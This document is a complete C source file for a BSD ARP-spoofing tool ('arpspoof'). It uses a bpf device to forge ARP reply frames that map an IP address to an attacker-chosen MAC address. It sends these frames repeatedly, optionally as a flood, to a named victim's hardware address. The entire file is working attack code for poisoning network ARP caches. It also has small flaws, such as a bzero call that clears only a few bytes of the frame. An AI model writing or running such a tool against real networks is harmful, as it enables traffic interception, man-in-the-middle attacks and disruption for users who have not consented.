/*-
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * <csjp@sqrt.ca> wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.
 * 
 * --Christian S.J. Peron
 * ----------------------------------------------------------------------------
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/ioctl.h>

#include <net/bpf.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_dl.h>

#include <arpa/inet.h>

#include <netinet/in.h>

#include <assert.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <unistd.h>
#include <stdlib.h>
#include <ifaddrs.h>

struct __attribute__ ((__packed__)) arp_pkthdr {
	u_short		ar_hrd; 
	u_short		ar_pro;
	u_char		ar_hln;
	u_char		ar_pln;
	u_short		ar_op;
};
static int		 bpfd;
static int		 fflag;
static char		*iflag;
static char		*tflag;
static char		*dflag;
static char		*sflag;

#define ar_spa(ap)	(((u_char *)((ap)+1))+(ap)->ar_hln)
#define ar_sha(ap)	(((u_char *)((ap)+1)))

static void
gethwaddr(u_char *ptr)
{
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_dl *sdl;
	struct sockaddr *sa;

	if (getifaddrs(&ifap) != 0)
		errx(1, "getifaddrs failed");
	for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
		sa = ifa->ifa_addr;
		if (sa->sa_family != AF_LINK)
			continue;
		if (strcmp(iflag, ifa->ifa_name) != 0)
			continue;
		sdl = (struct sockaddr_dl *)ifa->ifa_addr;
		bcopy(sdl->sdl_data + sdl->sdl_nlen, ptr, 6);
		freeifaddrs(ifap);
		return;
	}
	err(1, "invalid interface");
}

static void
usage(void)
{

	(void) fprintf(stderr,
	    "arpspoof [-f] [-s src macaddr] <-d macaddr> <-i interface> "
	    "<-t target macaddr> <ip>\n");
	(void) fprintf(stderr,
	    "    -f    Flood the frames out as fast as possible\n"
	    "    -d    Hardware address to be used in the IP mapping\n"
	    "    -i    Network interface to use\n"
	    "    -s    Optional source hardware address for the ARP reply\n"
	    "    -t    Victims hardware address\n");
	exit(1);
}

static void
etheraddr(char *estr, u_char *ea)
{
	struct ether_addr *eap;

	eap = ether_aton(estr);
	if (eap == NULL)
		errx(1, "invalid ether addr");
	bcopy(&eap->octet[0], ea, 6);
}

static int
buildheader(u_char *frame, char *ipstr)
{
	struct ether_header *eh;
	struct arp_pkthdr *ah;
	u_int32_t ip;
	u_char *ptr;

	bzero(&frame[0], sizeof(frame));
	/* First the Ethernet headers */
	eh = (struct ether_header *)&frame[0];
	eh->ether_type = ntohs(0x0806);			/* ETHERTYPE_ARP */
	etheraddr(tflag, &eh->ether_dhost[0]);
	if (sflag != NULL)
		etheraddr(sflag, &eh->ether_shost[0]);
	/* Then the ARP headers */
	ah = (struct arp_pkthdr *)(&frame[0] + 14);
	ah->ar_hrd = htons(1);				/* ARPHRD_ETHER */
	ah->ar_op = htons(2);				/* ARPOP_REPLY */
	ah->ar_pro = htons(0x0800);			/* ETHERTYPE_IP */
	ah->ar_pln = 4;					/* Length of IP */
	ah->ar_hln = 6;					/* Length of Ether */
	ip = inet_addr(ipstr);
	if (ip == INADDR_NONE)
		errx(1, "invalid ip address");
	ptr = ar_spa(ah);
	bcopy(&ip, ptr, sizeof(u_int32_t));
	ptr = ar_sha(ah);
	if (dflag != NULL)
		etheraddr(dflag, ptr);
	else
		gethwaddr(ptr);
	return (sizeof(*ah)+(2*ah->ar_pln)+(2*ah->ar_hln)+sizeof(*eh));
}

int
main(int argc, char *argv [])
{
	int fd, ch, sz, c, o;
	u_char frame[2048];
	struct ifreq ifreq;
	char bpf[64];

	while ((ch = getopt(argc, argv, "fd:i:t:s:")) != -1)
		switch (ch) {
		case 'f':
			fflag = 1;
			break;
		case 'd':
			dflag = optarg;
			break;
		case 'i':
			iflag = optarg;
			break;
		case 's':
			sflag = optarg;
			break;
		case 't':
			tflag = optarg;
			break;
		}
	argv += optind;
	argc -= optind;
	if (argc != 1 || iflag == NULL || tflag == NULL)
		usage();
	/*
	 * Lookup a free bpf(4) device.
	 */
	for (c = 0; c < 99; c++) {
		(void) sprintf(bpf, "/dev/bpf%d", c);
		fd = open(bpf, O_RDWR);
		if (fd < 0 && errno != EBUSY)
			err(1, "open failed");
		if (fd > 0)
			break;
	}
	if (fd < 0)
		err(1, "exhausted 99 bpf devices, giving up");
	bpfd = fd;
	/*
	 * Attach this bpf peer to a specific network interface
	 */
	strcpy(ifreq.ifr_name, iflag);
	if (ioctl(fd, BIOCSETIF, &ifreq) < 0)
		err(1, "ioctl failed");
	/*
	 * Construct false Ethernet header
	 */
	sz = buildheader(&frame[0], argv[0]);
	if (sflag != NULL) {
		o = 1;
		if (ioctl(fd, BIOCSHDRCMPLT, &o) < 0)
			err(1, "ioctl failed");
	}
	while (1) {
		if (fflag == 0)
			(void) usleep(10000);
		c = write(fd, &frame[0], sz);
		/*
		 * SEND-Q has filled up, sleep to give it a chance
		 * to drain all the mbufs that have been queued.
		 */
		if (c < 0 && errno == ENOBUFS)
			(void) usleep(100000);
		else if (c < 0)
			err(1, "write failed");
	}
	return (0);
}
